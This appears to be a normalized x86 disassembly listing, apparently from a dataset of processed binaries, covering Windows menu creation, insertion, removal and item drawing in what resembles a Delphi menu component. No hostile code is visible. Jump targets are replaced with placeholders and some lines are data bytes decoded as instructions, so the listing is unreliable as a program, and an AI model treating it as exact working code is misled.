cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45a90c
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45a90c
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45835c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45835c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45a90c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45a90c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_458508
push ebx
mov ebx eax
mov eax ebx
call sub_4550b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45d418
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_458540
push ebx
mov ebx eax
mov eax ebx
call sub_4550c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458570
push ebx
mov ebx eax
mov eax ebx
call sub_4550d8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4585a0
push ebx
mov ebx eax
mov eax ebx
call sub_455100
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4585d0
push ebx
mov ebx eax
mov eax ebx
call sub_455128
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404414
je r-xdata
mov al 0x1
pop ebx
retn
sub_458604
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4550ec
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_458640
push ebx
mov ebx eax
mov eax ebx
call sub_45513c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458674
push ebx
mov ebx eax
mov eax ebx
call sub_455150
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4586a8
push ebx
mov ebx eax
mov eax ebx
call sub_455164
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4586dc
push ebx
mov ebx eax
mov eax ebx
call sub_421004
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_458704
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_458724
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45a764
sub_458744
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45a7d4
sub_458764
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45a828
sub_458784
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4587a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40405c
sub_4587c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45a954
sub_4587e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45a930
sub_458804
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45a944
sub_458824
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_458850
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45833c
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45b260
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4588cc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45d1fc
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45a8fc
test eax eax
jg r-xdata
mov edx esi
call sub_45ac94
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45a90c
call sub_403290
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403290
lea eax [ esi + 0x44 ]
call sub_40d070
lea eax [ esi + 0x78 ]
call sub_40d070
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_458ce8
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41883c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
call sub_403290
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_458980
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_458bdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458be2
lea eax [ ebp - 0x40 ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4040a0
mov eax ebx
call sub_45a8fc
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_458e90
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404414
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45a8fc
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45aeb8
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_457fe4
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404388
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044c8
push eax
mov eax ebx
call sub_458e90
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45a4d4
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404414
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45a8fc
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_458e90
mov [ ebp - 0x25 ] eax
sub_458bfb
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_458980
xor eax eax
pop ebp
retn
sub_458c20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45c4f4
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b4bc
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b9b8
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4583bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_458c90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458cda
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d6f0
mov eax [ ebp - 0x4 ]
call sub_458244
mov edx eax
mov eax ebx
call sub_45a930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458ce1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_458ce8
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_458d60
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4207e4
sub_458d24
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420b64
mov eax ebx
call sub_45a8e4
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45a8e4
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
mov eax ebx
call sub_458d60
sub_458d60
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_458e90
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_458d60
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_458e90
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_458e90
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_458c20
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebp
call sub_458e90
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458e30
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45a8fc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45a90c
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45a90c
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45a90c
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_457f38
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_458e90
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_458c20
mov eax [ rw-data ]
call sub_457f38
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_458edc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420a8c
push ebx
push sub_458c90
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_458f20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_459104
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45aeb8
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040a0
test bh 0x4
je r-xdata
mov eax edi
call sub_45c4f4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4240d0
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042d0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423aa8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45910b
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4237e8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4237e8
mov eax 0xff00000d
call sub_4232e0
mov esi eax
mov eax 0xff000010
call sub_4232e0
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4237e8
jmp r-xdata
sub_459170
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_459a58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423fb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4237e8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423fb4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_455f34
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
